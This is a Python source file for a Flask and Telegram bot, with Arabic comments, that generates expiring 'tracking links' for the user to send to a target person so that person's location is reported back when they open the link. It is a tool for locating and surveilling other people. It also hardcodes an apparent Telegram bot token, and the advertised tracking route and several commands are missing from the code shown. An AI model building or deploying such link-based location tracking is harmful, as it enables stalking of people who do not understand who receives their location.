"""
بوت تتبع المواقع - Telegram Location Tracking Bot
نسخة معدلة تعمل على Render
البوت: @cccc00bot
"""

from flask import Flask, request, jsonify, render_template_string
import telebot
import threading
import logging
import os
import secrets
import time
from datetime import datetime, timedelta

# ========== إعدادات Logging محسنة ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== إعدادات البوت ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN)

# ========== تخزين البيانات ==========
tracking_links = {}
user_data = {}

# ========== متغيرات التتبع ==========
bot_start_time = None
bot_running = False

# ========== الصفحة الرئيسية ==========
@app.route('/')
def home():
    """الصفحة الرئيسية"""
    bot_status = "🟢 يعمل" if bot_running else "🔴 متوقف"
    
    return f'''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>📍 بوت التتبع</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }}
            .container {{
                background: rgba(255, 255, 255, 0.1);
                padding: 40px;
                border-radius: 20px;
                backdrop-filter: blur(10px);
                max-width: 600px;
                margin: 0 auto;
            }}
            .status {{
                background: rgba(255, 255, 255, 0.2);
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📍 بوت تتبع المواقع</h1>
            <div class="status">
                <p>✅ الخدمة تعمل</p>
                <p>🤖 البوت: @cccc00bot</p>
                <p>📊 الحالة: {bot_status}</p>
                <p>🔗 الروابط النشطة: {len(tracking_links)}</p>
                <p>👥 المستخدمين: {len(user_data)}</p>
            </div>
            <div>
                <a href="/health" style="color: #4CAF50; font-weight: bold; margin: 10px;">فحص الصحة</a>
                <a href="/bot_status" style="color: #2196F3; font-weight: bold; margin: 10px;">حالة البوت</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    """فحص صحة الخادم"""
    return jsonify({
        'status': 'healthy',
        'service': 'telegram-tracking-bot',
        'bot': '@cccc00bot',
        'bot_running': bot_running,
        'bot_start_time': str(bot_start_time),
        'active_links': len(tracking_links),
        'total_users': len(user_data),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/bot_status')
def bot_status():
    """حالة البوت"""
    return jsonify({
        'bot_running': bot_running,
        'bot_start_time': str(bot_start_time),
        'bot_username': 'cccc00bot',
        'current_time': datetime.now().isoformat()
    })

# ========== معالجات البوت ==========
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """معالجة أمر /start"""
    try:
        global user_data
        user_id = message.from_user.id
        username = message.from_user.username or "بدون"
        first_name = message.from_user.first_name or "مستخدم"
        
        logger.info(f"📩 استقبل /start من: {username} ({first_name})")
        
        # حفظ بيانات المستخدم
        user_data[user_id] = {
            'name': first_name,
            'username': username,
            'first_seen': datetime.now().isoformat(),
            'last_active': datetime.now().isoformat()
        }
        
        response = f"""
🎯 **مرحباً {first_name}!** 👋

📍 **بوت تتبع المواقع الآمن**
🤖 **البوت:** @cccc00bot

🚀 **الأوامر المتاحة:**
📍 `/newlink` - إنشاء رابط تتبع جديد
📊 `/mylinks` - عرض روابطك النشطة
🔄 `/reset` - حذف جميع روابطك
📈 `/stats` - إحصائياتك
❓ `/help` - المساعدة
🔧 `/status` - حالة البوت

🔒 **مميزات البوت:**
• روابط تنتهي بعد 24 ساعة
• إشعارات فورية عند تحديد الموقع
• حماية خصوصية كاملة

💡 **ابدأ الآن:** أرسل `/newlink`
        """
        
        bot.reply_to(message, response, parse_mode='Markdown')
        logger.info(f"✅ تم الرد على {username}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في /start: {e}")

@bot.message_handler(commands=['newlink'])
def handle_newlink(message):
    """إنشاء رابط تتبع جديد"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # إنشاء معرف فريد
        tracking_id = secrets.token_urlsafe(12)
        
        # حفظ الرابط
        tracking_links[tracking_id] = {
            'chat_id': chat_id,
            'user_id': user_id,
            'created_at': datetime.now().isoformat(),
            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat(),
            'active': True,
            'visits': 0,
            'successful_tracks': 0
        }
        
        # تحديث بيانات المستخدم
        if user_id in user_data:
            user_data[user_id]['last_active'] = datetime.now().isoformat()
        
        # إنشاء الرابط
        tracking_url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{tracking_id}'
        
        response = f"""
✅ **تم إنشاء رابط تتبع جديد!**

🔗 **الرابط:**
`{tracking_url}`

🆔 **الكود:** `{tracking_id}`
⏰ **الصلاحية:** 24 ساعة
📊 **الحالة:** نشط 🔵

📋 **طريقة الاستخدام:**
1. شارك هذا الرابط مع الشخص المطلوب
2. عند فتح الرابط، سيطلب الإذن للوصول للموقع
3. سيصلك إشعار فوري عند تحديد الموقع

⚠️ **ملاحظة:** الرابط ينتهي تلقائياً بعد 24 ساعة
        """
        
        bot.reply_to(message, response, parse_mode='Markdown')
        logger.info(f"📝 تم إنشاء رابط: {tracking_id} لـ {user_id}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في newlink: {e}")
        bot.reply_to(message, "❌ حدث خطأ في إنشاء الرابط. حاول مرة أخرى.")

@bot.message_handler(commands=['mylinks'])
def handle_mylinks(message):
    """عرض روابط المستخدم"""
    try:
        user_id = message.from_user.id
        
        # البحث عن روابط المستخدم
        user_links = []
        for track_id, info in tracking_links.items():
            if info['user_id'] == user_id and info['active']:
                expires_at = datetime.fromisoformat(info['expires_at'])
                if datetime.now() < expires_at:
                    hours_left = (expires_at - datetime.now()).total_seconds() / 3600
                    user_links.append({
                        'id': track_id,
                        'hours_left': int(hours_left),
                        'visits': info.get('visits', 0),
                        'tracks': info.get('successful_tracks', 0)
                    })
        
        if not user_links:
            bot.reply_to(message, "📭 **لا توجد روابط نشطة حالياً**\n\nاستخدم `/newlink` لإنشاء رابط جديد.", parse_mode='Markdown')
            return
        
        response = "🔗 **روابطك النشطة:**\n\n"
        for i, link in enumerate(user_links, 1):
            url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{link["id"]}'
            response += f"{i}. **الكود:** `{link['id'][:8]}...`\n"
            response += f"   ⏰ **متبقي:** {link['hours_left']} ساعة\n"
            response += f"   👁️ **الزيارات:** {link['visits']}\n"
            response += f"   📍 **التتبعات:** {link['tracks']}\n\n"
        
        response += f"📊 **الإجمالي:** {len(user_links)} رابط نشط"
        
        bot.reply_to(message, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"❌ خطأ في mylinks: {e}")
        bot.reply_to(message, "❌ حدث خطأ في عرض الروابط.")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """حالة البوت"""
    try:
        status_text = f"""
🟢 **حالة النظام:**

🤖 **البوت:** @cccc00bot
🌐 **الحالة:** {'يعمل ✅' if bot_running else 'متوقف ❌'}
⏰ **وقت التشغيل:** {str(bot_start_time) if bot_start_time else 'غير معروف'}
🔗 **الروابط النشطة:** {len(tracking_links)}
👥 **المستخدمين:** {len(user_data)}

🕒 **الوقت الحالي:** {datetime.now().strftime('%Y/%m/%d %I:%M:%S %p')}

🔧 **روابط التحكم:**
• [فحص الصحة](https://telegram-tracking-bot-nkgz.onrender.com/health)
• [الصفحة الرئيسية](https://telegram-tracking-bot-nkgz.onrender.com)
        """
        
        bot.reply_to(message, status_text, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"❌ خطأ في status: {e}")

# ========== تشغيل البوت ==========
def run_bot():
    """تشغيل البوت مع إعادة محاولة ذكية"""
    global bot_running, bot_start_time
    
    logger.info("🚀 محاولة تشغيل البوت...")
    
    while True:
        try:
            # اختبار الاتصال
            logger.info("🔍 اختبار الاتصال بـ Telegram API...")
            bot_info = bot.get_me()
            logger.info(f"✅ الاتصال ناجح! البوت: @{bot_info.username}")
            
            bot_running = True
            bot_start_time = datetime.now()
            
            # بدء Polling
            logger.info("🎯 بدء استقبال الرسائل...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60, logger_level=logging.INFO)
            
            # إذا وصلنا هنا، فقد توقف Polling
            logger.warning("⚠️ توقف Polling، إعادة المحاولة...")
            bot_running = False
            
        except Exception as e:
            bot_running = False
            logger.error(f"❌ خطأ في البوت: {e}")
            logger.info("⏳ إعادة المحاولة بعد 10 ثواني...")
            time.sleep(10)

# ========== بدء التشغيل ==========
if __name__ == '__main__':
    # بدء البوت في خيط منفصل
    logger.info("🔧 بدء إعداد النظام...")
    
    # تأخير بسيط لضمان تحميل كل شيء
    time.sleep(2)
    
    # تشغيل البوت
    bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
    bot_thread.start()
    
    logger.info("✅ خيط البوت بدأ التشغيل")
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 بدء خادم Flask على المنفذ {port}")
    
    # إرسال رسالة بدء التشغيل
    time.sleep(3)
    logger.info("=" * 50)
    logger.info("✅ النظام جاهز للعمل!")
    logger.info("🤖 البوت: @cccc00bot")
    logger.info(f"🌐 الخادم: http://0.0.0.0:{port}")
    logger.info("=" * 50)
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)